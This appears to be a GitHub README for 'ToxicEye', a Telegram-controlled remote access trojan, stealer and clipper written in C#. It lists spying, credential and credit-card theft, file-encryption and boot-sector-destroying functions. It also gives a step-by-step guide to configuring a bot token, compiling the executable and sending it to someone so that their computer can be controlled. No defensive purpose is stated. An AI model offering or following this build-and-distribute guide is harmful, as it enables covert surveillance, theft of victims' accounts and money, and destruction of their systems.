# ToxicEye
telegram malware
🔱 ToxicEye (RAT + STEALER + CLIPPER)
Program for remote control of windows computers via telegram bot. Written in C#

![logo](https://user-images.githubusercontent.com/102240206/160681490-46809716-2e5a-4456-aa5c-746b33575fa1.png)


🍂 Functions:
ComputerInfo, BatteryInfo, Location, Whois, ActiveWindow, Webcam, Microphone, Desktop, Keylogger, ClipboardSet, ClipboardGet, ProcessList, ProcessKill, ProcessStart, TaskManagerDisable, TaskManagerEnable, MinimizeAllWindows, MaximizeAllWindows, GetPasswords, GetCreditCards, GetHistory, GetBookmarks, GetCookies, GetDesktop, GetFileZilla, GetDiscord, GetTelegram, GetSteam, OpenCD, CloseCD, DownloadFile, UploadFile, RunFile, RunFileAdmin, ListFiles, RemoveFile, RemoveDir, MoveFile, MoveDir, CopyFile, CopyDir, Speak, Shell, MessageBox, OpenURL, SendKeyPress, NetDiscover, AudioVolumeSet, AudioVolumeGet, SetWallPaper, BlockInput, Monitor(off/on), DisplayRotate, EncryptFileSystem, DecryptFileSystem,ForkBomb, BsoD, OverwriteBootSector, Shutdown, Reboot, Hibernate, Logoff, Help, About, Uninstall.

🔨 Compiling guide:
Go to the @BotFather bot and create your own bot. You need to save the token and bot name.
![createBot](https://user-images.githubusercontent.com/102240206/160681517-91b59c1e-94e5-46d9-ba0b-c6d10e746689.jpg)

Now you need to get your chat id. To do this, go to the next bot @chatid_echo_bot and save the id.
![chatidBot](https://user-images.githubusercontent.com/102240206/160681564-9815db0b-1a8b-4466-8bd3-d5a6ab468bfb.jpg)

Now you need to download Visual Studio 2019

Download the source code of this program.
![loadSourceCode](https://user-images.githubusercontent.com/102240206/160681595-943a5c9d-ed54-477d-86e1-9d891621ca67.jpg)

Unzip the “Telegram RAT” folder to your desktop.
Open the TelegramRAT.sln file through Visual Studio.
Open file config.cs in project.
![openConfig](https://user-images.githubusercontent.com/102240206/160681617-c378c2a9-e6e5-4df4-91a9-fd48961da455.jpg)

Insert your token from the bot and your chatID that you received earlier.
Above you need to select ”Release”.
![saveConfig](https://user-images.githubusercontent.com/102240206/160681632-20e19e8e-9423-40cc-9a21-f87d54097ee1.jpg)

Press CTRL + S to save. And CTRL + B to compile everything into an executable file.
![build](https://user-images.githubusercontent.com/102240206/160681645-d9502bfb-307e-4958-a5c0-ecdbf9f723be.jpg)

You can send the received file to someone.
After starting the file, you can control the computer through the bot.
![openMalware](https://user-images.githubusercontent.com/102240206/160681684-06150bda-535f-46f1-aa0a-7041c0c49459.jpg)

Write /help to see all available commands.
